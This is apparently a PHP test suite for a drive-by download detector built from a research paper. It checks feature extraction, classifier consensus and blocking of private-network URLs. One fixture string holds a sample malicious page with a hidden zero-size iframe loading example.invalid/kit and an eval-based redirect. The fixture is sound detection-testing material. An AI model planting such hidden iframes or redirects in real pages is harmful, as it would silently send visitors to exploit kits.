<?php

declare(strict_types=1);

use DrivebyLab\Service\DetectionService;
use DrivebyLab\Service\HtmlFeatureExtractor;
use DrivebyLab\Service\SafeSourceFetcher;

require __DIR__ . '/../src/bootstrap.php';

$config = require __DIR__ . '/../config/paper.php';

function assertTrue(bool $condition, string $message): void
{
    if (!$condition) {
        throw new RuntimeException($message);
    }
}

$extractor = new HtmlFeatureExtractor();
$detector = new DetectionService($extractor);
$fetcher = new SafeSourceFetcher();

assertTrue($config['paper']['doi'] === '10.4018/IJISP.2017100102', 'Paper DOI must be configured accurately.');
assertTrue($config['paper']['dataset_size'] === 5435, 'Paper dataset size must be represented.');
assertTrue(count($config['feature_definitions']) === 15, 'The selected 15 feature signals should be represented.');
assertTrue(count($config['classifiers']) === 5, 'The top five classifier profiles should be represented.');

$benign = '<!doctype html><html><head><title>Guide</title></head><body><h1>Security Guide</h1><p>Simple static page.</p><a href="/policy">Policy</a></body></html>';
$benignFeatures = $extractor->extract($benign);
assertTrue($benignFeatures['eval_calls'] === 0.0, 'Benign source should not trigger eval.');
assertTrue($benignFeatures['iframe_count'] === 0.0, 'Benign source should not trigger iframe count.');
assertTrue($benignFeatures['zero_pixel_objects'] === 0.0, 'Benign source should not trigger zero-pixel objects.');

$malicious = '<html onload="start()"><body><iframe src="http://example.invalid/kit" width="0" height="0" style="display:none"></iframe><script>var x="location"; for(var i=0;i<2;i++){ setTimeout(function(){ eval("window.location.href=\\\"http://example.invalid\\\""); }, 100); }</script></body></html>';
$maliciousFeatures = $extractor->extract($malicious);
assertTrue($maliciousFeatures['iframe_count'] > 0.0, 'Malicious source should trigger iframe count.');
assertTrue($maliciousFeatures['zero_pixel_objects'] > 0.0, 'Malicious source should trigger zero-pixel objects.');
assertTrue($maliciousFeatures['eval_calls'] > 0.0, 'Malicious source should trigger eval calls.');
assertTrue($maliciousFeatures['onload_handlers'] > 0.0, 'Malicious source should trigger onload handlers.');

$maliciousAnalysis = $detector->analyze($malicious, $config);
assertTrue($maliciousAnalysis['consensus_label'] === 'malicious', 'Malicious-pattern source should produce malicious consensus.');
assertTrue(count($maliciousAnalysis['predictions']) === 5, 'Detector should return five classifier profile predictions.');

$benignAnalysis = $detector->analyze($benign, $config);
assertTrue(in_array($benignAnalysis['consensus_label'], ['benign', 'review'], true), 'Benign source should not produce strong malicious consensus.');

try {
    $fetcher->validateUrl('http://127.0.0.1/admin');
    assertTrue(false, 'Private network URL should be blocked.');
} catch (RuntimeException) {
    assertTrue(true, 'Private network URL blocked.');
}

echo 'test-suite-ok' . PHP_EOL;
